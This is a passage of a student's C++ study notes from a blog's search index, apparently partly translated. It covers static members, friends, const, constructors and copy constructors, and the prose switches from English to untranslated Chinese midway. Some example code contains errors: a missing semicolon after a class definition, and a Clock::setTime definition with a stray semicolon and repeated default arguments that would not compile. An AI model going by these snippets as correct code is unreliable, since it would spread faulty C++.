                                             </span></span><br><span class="line">  count++;            <span class="comment">//increment count in constructor, all objects maintain the same count </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">Point</span>(Point &amp;p)&#123;      <span class="comment">//copy constructor</span></span><br><span class="line">x = p.x;</span><br><span class="line">y = p.y;</span><br><span class="line">count++;</span><br><span class="line">&#125; </span><br><span class="line">~<span class="built_in">Point</span>() &#123; count--; &#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getX</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> x; &#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getY</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> y; &#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">showCount</span><span class="params">()</span> </span>&#123; <span class="comment">//output static data member </span></span><br><span class="line">  cout &lt;&lt; <span class="string">&quot; Object count = &quot;</span> &lt;&lt; count &lt;&lt; endl;</span><br><span class="line">  &#125; </span><br><span class="line"><span class="keyword">private</span>:             <span class="comment">//private data members </span></span><br><span class="line">  <span class="type">int</span> x, y; </span><br><span class="line">  <span class="type">static</span> <span class="type">int</span> count;  <span class="comment">//static data member declaration, used to record the number of points </span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> Point::count = <span class="number">0</span>;<span class="comment">//static data member definition and initialization, using class name qualifier </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;         <span class="comment">//main function </span></span><br><span class="line">  <span class="function">Point <span class="title">a</span><span class="params">(<span class="number">4</span>, <span class="number">5</span>)</span></span>;     <span class="comment">//define object a, its constructor will increment count by 1 </span></span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;Point A: &quot;</span> &lt;&lt; a.<span class="built_in">getX</span>() &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; a.<span class="built_in">getY</span>(); a.<span class="built_in">showCount</span>(); <span class="comment">//output object count</span></span><br><span class="line"><span class="function">Point <span class="title">b</span><span class="params">(a)</span></span>;        <span class="comment">//define object b, its constructor will increment count by 1 </span></span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;Point B: &quot;</span> &lt;&lt; b.<span class="built_in">getX</span>() &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; b.<span class="built_in">getY</span>(); b.<span class="built_in">showCount</span>(); <span class="comment">//output object count </span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Static-Member-Functions"><a href="#Static-Member-Functions" class="headerlink" title="Static Member Functions"></a>Static Member Functions</h2><p>There’s actually a problem in the above program: the showcount function requires the existence of a Point object to be called, but what if I want to directly output the value of count? This is when static member functions are needed, allowing direct function calls through the class name without depending on objects.</p><div class="note success flat"><p>Although static member functions can also be accessed using objects, it’s generally customary to access them through the class name. Even when accessed through an object name, the function has no relationship with the object.</p></div><h1 id="Class-Friends"><a href="#Class-Friends" class="headerlink" title="Class Friends"></a>Class Friends</h1><p>Using the Point class as an example, what if we need a function to calculate the distance between two points?</p><p>Setting it as an ordinary function outside the class doesn’t reflect the connection between the function and points, and can’t directly use point coordinates;</p><p>Setting it as a member function inside the class doesn’t conform to the abstraction that a class represents the characteristics of a type of thing, because distance represents the relationship between points, not the characteristics of a point.</p><blockquote><p>In <a href="https://hustlixiang21.github.io/2022/07/20/CPP%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1/">class composition</a>, there’s a Point and Line class, and the Line class has a function to calculate line segment length. But if we’re facing many points and frequently need to calculate distances between any two points, do we need to construct a Line class every time? This is obviously very troublesome.</p></blockquote><p>Friend relationships provide a mechanism for data sharing between member functions of different classes or objects, and between class member functions and general functions.</p><p>In a class, the keyword <strong>friend</strong> is used to declare functions as friend functions and classes as friend classes. <strong>All functions of a friend class are friend functions</strong>.</p><h2 id="Friend-Functions"><a href="#Friend-Functions" class="headerlink" title="Friend Functions"></a>Friend Functions</h2><p>These are <strong>non-member functions</strong> modified with the keyword <strong>friend</strong> in a class. They can be ordinary functions or member functions of other classes. In the function body of friend functions, private and protected members of the class can be accessed through object names.</p><p>There’s <a href="https://github.com/hustlixiang21/cpp-practice/blob/main/Point_distance(friend)/main.cpp">practice source code</a> on github.</p><h2 id="Friend-Classes"><a href="#Friend-Classes" class="headerlink" title="Friend Classes"></a>Friend Classes</h2><p>Similar to friend functions. If class A is a friend class of class B, then all member functions of class A are friend functions of class B and can access private and protected members of class B.</p><p>Special attention ⚠️:</p><ul><li>Friend relationships are <strong>not transitive</strong>. If B is a friend of A and C is a friend of B, C is <strong>not a friend of A</strong> without explicit declaration.</li><li>Friend relationships are <strong>unidirectional</strong>. If B is a friend of A, B can access A, but A cannot access B.</li><li>Friend relationships are <strong>not inherited</strong>. If B is a friend of A, B’s derived classes do not automatically become friends of A. A simple analogy is: if someone trusts your father, they don’t necessarily trust you.</li></ul><h1 id="Shared-Data-Protection"><a href="#Shared-Data-Protection" class="headerlink" title="Shared Data Protection"></a>Shared Data Protection</h1><h2 id="Constant-Objects"><a href="#Constant-Objects" class="headerlink" title="Constant Objects"></a>Constant Objects</h2><p>The data value members of constant objects cannot be changed during the entire lifetime of the object. <strong><u>Constant objects must be initialized and cannot be updated.</u></strong></p><div class="note warning flat"><p>Specifying initial values at definition is called initialization, and subsequent changes through assignment operations are called assignment. <strong>Don’t confuse initialization with assignment</strong>!</p></div><h2 id="Class-Members-Modified-with-const"><a href="#Class-Members-Modified-with-const" class="headerlink" title="Class Members Modified with const"></a>Class Members Modified with const</h2><h3 id="Constant-Member-Functions"><a href="#Constant-Member-Functions" class="headerlink" title="Constant Member Functions"></a>Constant Member Functions</h3><p>Declaration format:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">type_specifier <span class="title">function_name</span><span class="params">(parameter_list)</span> <span class="type">const</span></span>;</span><br></pre></td></tr></table></figure><p>Note ⚠️:</p><ul><li>If an object is a constant object, only constant member functions can be called through that constant object, <strong>other member functions cannot be called</strong>! This is C++’s protection for constant objects and is the <strong>only external interface method</strong> for constant objects.</li><li>Whether called through a constant object or not, during the call of a constant member function, the target object is treated as a constant object. Therefore, constant member functions cannot update the data members of the target object, nor can they call member functions of that class that are not modified with const for the target object (ensuring that constant member functions do not modify the data member values of the target object).</li><li>The const keyword can be used to distinguish overloaded functions (functions with the same name but with or without const are different functions).</li></ul><h3 id="Constant-Data-Members"><a href="#Constant-Data-Members" class="headerlink" title="Constant Data Members"></a>Constant Data Members</h3><p>Data members declared with const are constant data members, and no function can assign values to them. Constructors can only obtain initial values through initialization lists for these data members.</p><div class="note info flat"><p>Static variables and constants in class members should be defined outside the class definition, but C++ provides an exception: if a class’s static constant has integer type or enumeration type, the constant value can be directly specified in the class definition.</p></div><h3 id="Constant-References"><a href="#Constant-References" class="headerlink" title="Constant References"></a>Constant References</h3><p>If a reference is modified with const when declared, the declared reference is a constant reference, and the object referenced by the constant reference cannot be updated. When used as function parameters, it prevents accidental changes to actual parameters.</p><blockquote><p>For parameters whose values cannot be changed in functions, it’s not suitable to use ordinary reference passing, as it would prevent <strong>constant objects from being passed in</strong>. Using pass-by-value or passing constant references can avoid this problem. Pass-by-value is more time-consuming, so passing constant references is better. Copy constructor parameters generally also choose constant references!</p></blockquote><h1 id="Multi-file-Structure-and-Compilation-Preprocessing-Commands"><a href="#Multi-file-Structure-and-Compilation-Preprocessing-Commands" class="headerlink" title="Multi-file Structure and Compilation Preprocessing Commands"></a>Multi-file Structure and Compilation Preprocessing Commands</h1><p>Since there’s a foundation in C language, this section only lists some unfamiliar and less memorable content.</p><h2 id="General-Organization-Structure-of-C-Programs"><a href="#General-Organization-Structure-of-C-Programs" class="headerlink" title="General Organization Structure of C++ Programs"></a>General Organization Structure of C++ Programs</h2><p>A project can be divided into multiple source files:</p><ul><li>Class declaration files (.h files) </li><li>Class implementation files (.cpp files) </li><li>Class usage files (.cpp files containing main())</li></ul><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-22%2000.16.36.png"></p><h2 id="Standard-C-Library"><a href="#Standard-C-Library" class="headerlink" title="Standard C++ Library"></a>Standard C++ Library</h2><p>The standard C++ class library is a collection of extremely flexible and extensible reusable software modules.</p><p>Standard C++ classes and components are logically divided into 6 types:</p><ul><li>Input&#x2F;Output classes  </li><li>Container classes and abstract data types </li><li>Storage management classes </li><li>Algorithms </li><li>Error handling </li><li>Runtime environment support</li></ul><h1 id="Comprehensive-Example—Personal-Bank-Account-Management-Program"><a href="#Comprehensive-Example—Personal-Bank-Account-Management-Program" class="headerlink" title="Comprehensive Example—Personal Bank Account Management Program"></a>Comprehensive Example—Personal Bank Account Management Program</h1><p>The program source code has been uploaded to <a href="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management">github</a> and compiled using <a href="https://hustlixiang21.github.io/2022/06/19/Makefile%E5%85%A5%E9%97%A8/">makefile</a>.</p><div class="note danger flat"><p>Serious error: static variables were not assigned initial values externally, causing my progress to stagnate for two hours, and the initialization assignment was done in the file where the class member functions are defined.</p></div>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ Classes and Objects</title>
      <link href="/2022/07/20/C++%20Classes%20and%20Objects/"/>
      <url>/2022/07/20/C++%20Classes%20and%20Objects/</url>
      
        <content type="html"><![CDATA[<h1 id="Classes-and-Objects"><a href="#Classes-and-Objects" class="headerlink" title="Classes and Objects"></a>Classes and Objects</h1><h2 id="Basic-Characteristics-of-Object-Oriented-Programming"><a href="#Basic-Characteristics-of-Object-Oriented-Programming" class="headerlink" title="Basic Characteristics of Object-Oriented Programming"></a>Basic Characteristics of Object-Oriented Programming</h2><p><strong>Abstraction</strong></p><ul><li>Summarize the common attributes and behaviors of objects of the same class to form a class.<ul><li>First focus on the essence and description of the problem, then the implementation process or details.</li><li>Data abstraction: Describe the attributes or state of objects of a certain class (physical quantities that distinguish objects from each other).</li><li>Code abstraction: Describe the common behavioral characteristics or functions that objects of a certain class have.</li><li>Implementation of abstraction: class.</li></ul></li><li>Abstraction example—Clock<ul><li>Data abstraction:<br>int hour,int minute,int second</li><li>Code abstraction:<br>setTime(),showTime()</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>  <span class="title class_">Clock</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">   <span class="function"><span class="type">void</span> <span class="title">setTime</span><span class="params">(<span class="type">int</span> newH, <span class="type">int</span> newM, <span class="type">int</span> newS)</span></span>;</span><br><span class="line">   <span class="function"><span class="type">void</span> <span class="title">showTime</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="keyword">private</span>:</span><br><span class="line">   <span class="type">int</span> hour, minute, second;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><p><strong>Encapsulation</strong></p><ul><li>Encapsulate the abstracted data and code together to form a class.<ul><li>Purpose: Enhance security and simplify programming. Users don’t need to understand specific implementation details, but only need to use class members through external interfaces with specific access permissions.</li><li>Implementation of encapsulation: {} in class declaration</li></ul></li><li>Example:</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>  <span class="title class_">Clock</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>: <span class="function"><span class="type">void</span> <span class="title">setTime</span><span class="params">(<span class="type">int</span> newH, <span class="type">int</span> newM, <span class="type">int</span> newS)</span></span>;</span><br><span class="line">          <span class="function"><span class="type">void</span> <span class="title">showTime</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="keyword">private</span>: <span class="type">int</span> hour, minute, second;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><p><strong>Inheritance</strong></p><ul><li>Extend on the basis of existing classes to form new classes.</li></ul><hr><p><strong>Polymorphism</strong></p><ul><li>Polymorphism: Same name, different functional implementations.</li><li>Purpose: Achieve unified behavioral identification and reduce the number of identifiers in the program.</li></ul><hr><h2 id="Definition-of-Classes-and-Objects"><a href="#Definition-of-Classes-and-Objects" class="headerlink" title="Definition of Classes and Objects"></a>Definition of Classes and Objects</h2><h3 id="Syntax-Form-of-Class-Definition"><a href="#Syntax-Form-of-Class-Definition" class="headerlink" title="Syntax Form of Class Definition"></a>Syntax Form of Class Definition</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">class_name</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="title">members</span> <span class="params">(external interface)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">private</span>:</span></span><br><span class="line"><span class="function">                private members</span></span><br><span class="line"><span class="function">    protected:</span></span><br><span class="line"><span class="function">                protected members</span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><hr><h3 id="In-class-Initial-Values"><a href="#In-class-Initial-Values" class="headerlink" title="In-class Initial Values"></a>In-class Initial Values</h3><ul><li>Can provide an in-class initial value for data members</li><li>When creating objects, in-class initial values are used to initialize data members</li><li>Members without initial values will be default initialized</li></ul><hr><h3 id="Class-Member-Access-Control"><a href="#Class-Member-Access-Control" class="headerlink" title="Class Member Access Control"></a>Class Member Access Control</h3><ul><li>Public type members<ul><li>Declared after the keyword public, they are the interface between the class and the outside, any external function can access public type data and functions</li></ul></li><li>Private type members<ul><li>Declared after the keyword private, only functions in this class can access them, and no external function can access them.</li><li>If private members are declared immediately after the class name, the keyword <strong>private</strong> can be omitted</li></ul></li><li>Protected type members<ul><li>Similar to private, the difference is manifested in the different effects on derived classes during inheritance and derivation</li></ul></li></ul><hr><h3 id="Class-Member-Functions"><a href="#Class-Member-Functions" class="headerlink" title="Class Member Functions"></a>Class Member Functions</h3><ul><li>Declare function prototypes in the class</li><li>Can provide function body implementation outside the class, and qualify with class name before the function name</li><li>Can also directly provide function body in the class, forming inline member functions</li><li>Allow declaration of overloaded functions and functions with default parameter values</li></ul><hr><h3 id="Class-and-Object-Program-Example"><a href="#Class-and-Object-Program-Example" class="headerlink" title="Class and Object Program Example"></a>Class and Object Program Example</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//class definition</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Clock</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">setTime</span><span class="params">(<span class="type">int</span> newH = <span class="number">0</span>,<span class="type">int</span> newM = <span class="number">0</span>,<span class="type">int</span> newS = <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">showTime</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> hour,minute,second;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//member function implementation</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clock::setTime</span><span class="params">(<span class="type">int</span> newH = <span class="number">0</span>,<span class="type">int</span> newM = <span class="number">0</span>,<span class="type">int</span> newS = <span class="number">0</span>)</span></span>;</span><br><span class="line">&#123;</span><br><span class="line">    hour = newH;</span><br><span class="line">    minute = newM;</span><br><span class="line">    second = newS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clock::showTime</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; hour &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; minute &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; second &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//object usage</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Clock myClock;</span><br><span class="line">    myClock.<span class="built_in">setTime</span>(<span class="number">8</span>,<span class="number">30</span>,<span class="number">30</span>);</span><br><span class="line">    myClock.<span class="built_in">showTime</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Constructors-and-Destructors"><a href="#Constructors-and-Destructors" class="headerlink" title="Constructors and Destructors"></a>Constructors and Destructors</h2><h3 id="Constructors"><a href="#Constructors" class="headerlink" title="Constructors"></a>Constructors</h3><h4 id="Purpose-of-Constructors"><a href="#Purpose-of-Constructors" class="headerlink" title="Purpose of Constructors"></a>Purpose of Constructors</h4><p>Use specific values to construct objects when they are created, <strong>initializing</strong> the object to a specific initial state.</p><blockquote><p>When hoping to construct a Clock class object and set the initial time to 0:0:0, this can be set through a constructor.</p></blockquote><hr><h4 id="Form-of-Constructors"><a href="#Form-of-Constructors" class="headerlink" title="Form of Constructors"></a>Form of Constructors</h4><ul><li>Function name is the same as class name</li><li>Cannot define return type, and cannot have return statements</li><li>Can have formal parameters or no formal parameters</li><li>Can be inline functions</li><li>Can be overloaded</li><li>Can have default parameter values</li></ul><hr><h4 id="Timing-of-Constructor-Calls"><a href="#Timing-of-Constructor-Calls" class="headerlink" title="Timing of Constructor Calls"></a>Timing of Constructor Calls</h4><p>Automatically called when objects are created</p><hr><h4 id="Constructor-Example"><a href="#Constructor-Example" class="headerlink" title="Constructor Example"></a>Constructor Example</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//class definition</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Clock</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">Clock</span>(<span class="type">int</span> newH,<span class="type">int</span> newM,<span class="type">int</span> newS);<span class="comment">//constructor</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">setTime</span><span class="params">(<span class="type">int</span> newH = <span class="number">0</span>,<span class="type">int</span> newM = <span class="number">0</span>,<span class="type">int</span> newS = <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">showTime</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> hour,minute,second;</span><br><span class="line">&#125;;<span class="comment">//there&#x27;s a semicolon here</span></span><br><span class="line"><span class="comment">//constructor implementation</span></span><br><span class="line">Clock::<span class="built_in">Clock</span>(<span class="type">int</span> newH,<span class="type">int</span> newM,<span class="type">int</span> newS): <span class="built_in">hour</span>(newH),<span class="built_in">minute</span>(newM),<span class="built_in">second</span>(newS)&#123;&#125;</span><br><span class="line"><span class="comment">//member function implementation</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clock::setTime</span><span class="params">(<span class="type">int</span> newH = <span class="number">0</span>,<span class="type">int</span> newM = <span class="number">0</span>,<span class="type">int</span> newS = <span class="number">0</span>)</span></span>;</span><br><span class="line">&#123;</span><br><span class="line">    hour = newH;</span><br><span class="line">    minute = newM;</span><br><span class="line">    second = newS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clock::showTime</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; hour &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; minute &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; second &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//object usage</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Clock <span class="title">c</span><span class="params">(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span></span>;<span class="comment">//automatically call constructor</span></span><br><span class="line">    c.<span class="built_in">showTime</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><blockquote><p>The :: symbol is the scope resolution operator, which means function definitions need to use class_name:: to qualify member functions.</p></blockquote><div class="note warning flat"><p>A very important thing is that there’s a semicolon after the class definition ends!!! (wasted a lot of time)</p></div><hr><h4 id="Default-Constructor"><a href="#Default-Constructor" class="headerlink" title="Default Constructor"></a>Default Constructor</h4><ul><li>Constructor that can be called without actual parameters<ul><li>Constructor with empty parameter list</li><li>Constructor where all parameters have default values</li></ul></li><li>The following two are both <strong>default constructors</strong>. If they appear simultaneously in a class, a compilation error will occur:</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Clock</span>();</span><br><span class="line"><span class="built_in">Clock</span>(<span class="type">int</span> newH=<span class="number">0</span>,<span class="type">int</span> newM=<span class="number">0</span>,<span class="type">int</span> newS=<span class="number">0</span>);</span><br><span class="line"><span class="comment">// Both functions require no initial values, so there will be a call conflict</span></span><br></pre></td></tr></table></figure><hr><h4 id="隐含生成的构造函数"><a href="#隐含生成的构造函数" class="headerlink" title="隐含生成的构造函数"></a>隐含生成的构造函数</h4><p>如果程序中未定义构造函数，编译器将在需要时自动生成一个<strong>默认构造函数</strong></p><ul><li>参数列表为空，不为数据成员设计初始值</li><li>如果类内定义了成员的初始值，则使用类内定义的初始值</li><li>如果没有定义类内的初始值，则以默认方式初始化</li><li>基本类型的数据默认初始化的值是不确定的</li></ul><hr><h4 id="“-default”"><a href="#“-default”" class="headerlink" title="“&#x3D;default”"></a>“&#x3D;default”</h4><p>如果类内已定义构造函数，默认情况下编译器不再隐含生成默认构造函数。<br>如果你坚持希望隐含生成默认构造函数，用“&#x3D;default”</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Clock</span>() = <span class="keyword">default</span>;<span class="comment">//指示编译器提供默认构造函数</span></span><br></pre></td></tr></table></figure><hr><h4 id="委托构造函数"><a href="#委托构造函数" class="headerlink" title="委托构造函数"></a>委托构造函数</h4><p>委托构造函数（delegating constructor）使用类其他构造函数执行初始化过程</p><p>例如</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Clock</span>(<span class="type">int</span> newH,<span class="type">int</span> newM,<span class="type">int</span> newS):<span class="built_in">hour</span>(newH),<span class="built_in">minute</span>(newM),<span class="built_in">second</span>(newS)&#123;&#125;</span><br><span class="line"><span class="built_in">Clock</span>():<span class="built_in">Clock</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)&#123;&#125;</span><br><span class="line"><span class="comment">//有的编译器并不支持委托构造函数</span></span><br></pre></td></tr></table></figure><hr><h3 id="复制构造函数"><a href="#复制构造函数" class="headerlink" title="复制构造函数"></a>复制构造函数</h3><p>复制构造函数时一种特殊的构造函数，其形参为本类的对象引用。作用是用一个已存在的对象去初始化同类型的新对象。</p><p>用法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> 类名</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        类名(形参);<span class="comment">//构造函数</span></span><br><span class="line">        类名(<span class="type">const</span> 类名&amp;对象名);<span class="comment">//复制构造函数</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line">类名::类(<span class="type">const</span> 类名&amp;对象名)<span class="comment">//复制构造函数的实现</span></span><br><span class="line">&#123;函数体&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="隐含的复制构造函数"><a href="#隐含的复制构造函数" class="headerlink" title="隐含的复制构造函数"></a>隐含的复制构造函数</h4><ul><li>如果没有为类声明拷贝初始化构造函数，则比编译器自己生成一个复制构造函数。</li><li>这个构造函数执行的功能是：用作为初始值对象的每个数据成员的值，初始化将要建立的对象的对应数据成员。</li></ul><hr><h4 id="“-delete”"><a href="#“-delete”" class="headerlink" title="“&#x3D;delete”"></a>“&#x3D;delete”</h4><p>如若不希望被复制构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Point(const Point&amp;p) = delete;</span><br></pre></td></tr></table></figure><hr><h4 id="复制构造函数被调用的三种情况"><a href="#复制构造函数被调用的三种情况" class="headerlink" title="复制构造函数被调用的三种情况"></a>复制构造函数被调用的三种情况</h4><ul><li>定义一个对象是，以被雷另一个对象作为初始值，发生复制构造</li><li>如果函数的形参是类的对象，调用函数时，将使用实参对象初始化形参对象，发生复制构造</li><li>如果函数的返回值是类的对象，函数执行完成返回主函数时，将使用return语句中的对象初始化一个临时无名对象，传递给主函数，此时发生复制构造</li></ul><hr><h3 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h3><p>作用：完成对象被删除前的一些清理工作</p><ul><li>在对象生存期结束的时刻系统自动调用它，然后再释放此对象所属的空间</li><li>如果程序中未声明析构函数，编译器会自动生成一个默认的析构函数，函数体为空</li></ul><hr><h2 id="类的组合"><a href="#类的组合" class="headerlink" title="类的组合"></a>类的组合</h2><p>说白了就是类的数据成员是别的类的对象，下面用计算两点之间线段的距离的程序来说明。</p><hr><h3 id="线段类和点类实例"><a href="#线段类和点类实例" class="headerlink" title="线段类和点类实例"></a>线段类和点类实例</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span 